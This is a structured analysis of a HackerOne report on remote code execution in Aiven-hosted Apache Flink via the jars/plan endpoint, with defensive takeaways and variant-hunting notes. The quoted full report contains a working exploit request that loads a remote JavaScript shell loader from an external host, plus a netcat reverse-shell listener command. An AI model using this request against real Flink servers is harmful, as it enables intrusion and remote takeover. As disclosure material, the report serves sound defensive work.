# Apache Flink RCE via Unrestricted GET jar/plan API Endpoint

## Metadata
- **Source:** HackerOne
- **Report:** 1418891 | https://hackerone.com/reports/1418891
- **Submitted:** 2021-12-07
- **Reporter:** jarij
- **Program:** Aiven
- **Bounty:** Not specified in report
- **Severity:** Critical
- **Vuln:** Remote Code Execution (RCE), Improper Access Control, Unsafe Deserialization, Command Injection
- **CVEs:** None
- **Category:** memory-binary

## Summary
Apache Flink's GET jars/{jar_id}/plan API endpoint was not properly restricted, allowing unauthenticated or low-privilege users to specify arbitrary entry classes and program arguments. By leveraging the com.sun.tools.script.shell.Main class available in the Java classpath, attackers could execute arbitrary code and gain remote code execution on the Flink server.

## Attack scenario
1. Attacker identifies an accessible Apache Flink instance managed by Aiven with the vulnerable GET /jars/{jar_id}/plan endpoint
2. Attacker discovers or uploads a jar file to the Flink server and obtains its jar_id
3. Attacker crafts a malicious GET request specifying entry-class=com.sun.tools.script.shell.Main
4. Attacker supplies programArg parameters that load and execute arbitrary JavaScript/shell code from an external source
5. Flink server processes the request, instantiates the specified class with attacker-controlled arguments, and executes the payload
6. Attacker gains remote code execution and can execute arbitrary commands, pivot to other systems, or establish persistent access

## Root cause
The jar/plan API endpoint lacked proper input validation and access controls. It accepted arbitrary entry-class parameters without whitelisting or validation, allowing instantiation of dangerous classes like com.sun.tools.script.shell.Main that could execute arbitrary code. The endpoint did not restrict which classes could be loaded or what arguments could be passed.

## Attacker mindset
An attacker would recognize that Flink's jar/plan endpoint is designed for job planning but could be abused by specifying alternative entry classes. They would identify that com.sun.tools.script.shell.Main (a legitimate Java tool) could be exploited to load and execute external scripts. The attacker would then use this as a gateway to establish full command execution capabilities on the server.

## Defensive takeaways
- Implement strict whitelist validation for entry-class parameters; only allow pre-approved job execution classes
- Restrict the jar/plan endpoint to authenticated and authorized users only; enforce role-based access control
- Disable or isolate dangerous Java classes like com.sun.tools.script.shell.Main from the classpath in production environments
- Implement argument validation and sanitization; reject programArg parameters that contain suspicious patterns or external URLs
- Use Java security policies and SecurityManager to restrict class loading and code execution capabilities
- Monitor and log all jar/plan API requests with detailed parameters for anomaly detection
- Keep Apache Flink and Java runtime updated with latest security patches
- Conduct regular security audits of API endpoints that accept user-controlled class names or execution parameters

## Variant hunting
Search for similar API endpoints in other distributed processing frameworks (Spark, Hadoop, Heron) that accept entry-class or main-class parameters. Investigate other Flink endpoints that manipulate jar files or job configurations. Look for Java applications using reflection-based job execution where user input influences class instantiation.

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1059 - Command and Scripting Interpreter
- T1203 - Exploitation for Client Execution
- T1105 - Ingress Tool Transfer
- T1021 - Remote Services (for lateral movement)

## Notes
The vulnerability required knowledge of Java internals and available classpath classes. The proof-of-concept demonstrates that even 'legitimate' Java classes can become attack vectors when exposed through insufficiently protected APIs. The fact that the Flink service would crash after exploitation suggests potential denial of service alongside the RCE impact. This vulnerability likely affected multiple Aiven customers running Apache Flink instances.

## Full report
<details><summary>Expand</summary>

## Summary:

Aiven has not restricted access to the GET `jars/{jar_id}/plan` API. This endpoint can be used to load java class files with the specified arguments that are in the java classpath on the server. This can be abused to gain RCE on the Apache Flink Server.

## Steps To Reproduce:

The video below shows how to setup the Apache Flink instance and run the PoC. Feel free to use my VPS which will make triaging somewhat easier (`ssh ████████`, password: `██████`):

█████████


  1. Login to my aiven account: `████`, password: `██████`
  1. Run the SQL job as demonstrated in the video
  1. Open the Flink Web UI and verify that there is a new job in the jobs panel.
  1. Setup netcat reverse shell listener on the VPS: `nc -n -lvp 8888`
  1. Update the poc.py variables to match your instance, if you are not using my Apache Flink instance
  1. Run the poc: `python3 poc.py`
  1. Reverse shell connection should pop up
 1. After connection has been closed, the Apache Flink will crash, so the Aiven service daemon will  have to restart it. Because of this, you have to run new SQL job after every time you run the poc script

# API Request

Here's the HTTP API request that exploits the issue:

```http
GET /jars/145df7ff-c71a-4f3a-b77a-ee4055b1bede_a.jar/plan?entry-class=com.sun.tools.script.shell.Main&programArg=-e,load("https://fs.bugbounty.jarijaas.fi/aiven-flink/shell-loader.js")&parallelism=1 HTTP/1.1
Host: ████
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
Authorization: Basic █████
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"
Accept: application/json, text/plain, */*
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
sec-ch-ua-platform: "Windows"
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Language: en-US,en;q=0.9,fi;q=0.8
```

## Impact

Attacker can execute commands on the server and use this access to potentially pivot into other resources in the network.

</details>

---
*Analysed by Claude on 2026-05-11*
